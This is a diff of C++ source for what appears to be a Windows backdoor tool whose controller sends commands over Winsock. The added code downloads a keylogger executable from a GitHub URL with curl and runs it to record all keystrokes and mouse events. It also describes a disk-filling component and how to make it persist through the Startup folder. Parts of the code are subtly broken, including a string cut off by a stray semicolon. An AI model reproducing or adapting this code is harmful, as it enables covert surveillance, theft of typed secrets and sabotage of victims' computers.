@@ -24,7 +24,6 @@ string cin_string();
 int main()
 {
 
-    
     // Initialze wonsock
     WSADATA wsData;
     WORD ver = MAKEWORD(2, 2);
@@ -94,7 +93,6 @@ int main()
 
         int bytesSend = send(clientSocket, buffer, sizeof(buffer), 0);
 
-
         if (buffer == "q")
         {
             break;
@@ -118,9 +116,7 @@ int main()
 
             cout << response;
         }
-
     }
-
 }
 
 string cin_string()
@@ -209,7 +205,19 @@ string CMR_InfoComp(string buffer)
     string ebuf = buffer;
     if (ebuf.find("keylog") != string::npos)
     {
-        ebuf = "echo [CMP] [INFO] - This components is built in C++ language and it logs all mouse and keyboard events and makes them available in C:\\log.txt file. And the keylogger.exe file is in C:\\Ms \nAll events will be added to the file cumulatively, you can delete it if you want, or you can use the following command: $ cmp reset keylog";
+        ebuf = "echo [CMP] [INFO] - This components is built in C++ language and it logs all mouse and keyboard events and makes them available in C:\\ProgramData\\Ms\\log.txt file. And the keylogger.exe file is in C:\\ProgramData\\Ms \nAll events will be added to the file cumulatively, you can delete it if you want to re-registration, or you can use the following command: $ cmp reset keylog \n" +
+               "[ $ ] - Available Commands : \n" +
+               "[ $ cmp run keylog ] ->  for start recording \n" +
+               "[ $ cmp info keylog ] -> show some info for keylog component\n" +
+               "[ $ cmp reset keylog ] -> delete keylog file :  C:\\ProgramData\\Ms\\log.txt \n";
+    }
+    else if (ebuf.find("fill_storage") != string::npos)
+    {
+        ebuf = "echo [CMP] [INFO] - This components is built in betch, This add-on fills the device with large files and is created very quickly so that the storage capacity of the device can be filled in three seconds, and you can also make it more dangerous by copying the file fill_storage_move.bat to C:\Users\\s3q\\AppData\\Roaming\\Microsoft\\Windows \\Start Menu\\Programs\\Startup . So that it works automatically when you startup the device" +
+               "[ $ ] - Available Commands : \n" +
+               "[ $ cmp run fill_storage ] ->  for start fill storage \n" +
+               "[ $ cmp startup fill_storage ] -> copying the file fill_storage_move.bat to C:\Users\\s3q\\AppData\\Roaming\\Microsoft\\Windows \\Start Menu\\Programs\\Startup\n";
+               "[ $ cmp info fill_storage ] -> show some info for fill_storage component\n";
     }
     else
     {
@@ -223,14 +231,13 @@ string CMR_RunComp(string buffer)
 {
     string ebuf = buffer;
 
-    string compcmd = "IF NOT EXIST \"C:\\Ms\" ( mkdir C:\\Ms ) ELSE ( echo; ) && ";
-
+    string compcmd = "IF NOT EXIST C:\\ProgramData ( mkdir C:\\ProgramData ) ELSE ( echo; ) && IF NOT EXIST C:\\ProgramData\\Ms ( mkdir C:\\ProgramData\\Ms ) ELSE ( echo; ) && ";
 
     string path = "C:\\Ms\\keylogger.exe";
 
     if (ebuf.find("keylog") != string::npos)
     {
-        compcmd += "curl -H \"Accept: application/vnd.github.v3+json\" https://raw.githubusercontent.com/s3q/blackdoor/main/components/keylogger.exe -o " + path + " && IF EXIST C:\\Ms\\keylogger.exe ( start C:\\Ms\\keylogger.exe ) ELSE ( echo; ) && echo \n[CMP] [DOWNLOAD] - keylogger.exe components \n[CMP] [RUN] - keylog components ..";
+        compcmd += "curl -H \"Accept: application/vnd.github.v3+json\" https://raw.githubusercontent.com/s3q/blackdoor/main/components/keylogger.exe -o " + path + " && IF EXIST C:\\ProgramData\\Ms\\keylogger.exe ( start C:\\ProgramData\\Ms\\keylogger.exe ) ELSE ( echo; ) && echo \n[CMP] [DOWNLOAD] - keylogger.exe components \n[CMP] [RUN] - keylog components ..";
         ebuf = compcmd;
     }
     else
@@ -251,7 +258,6 @@ string CMR_StopComp(string buffer)
 
     return ebuf;
 }
-
 
 // echo "# backdoor" >> README.md
 // git init
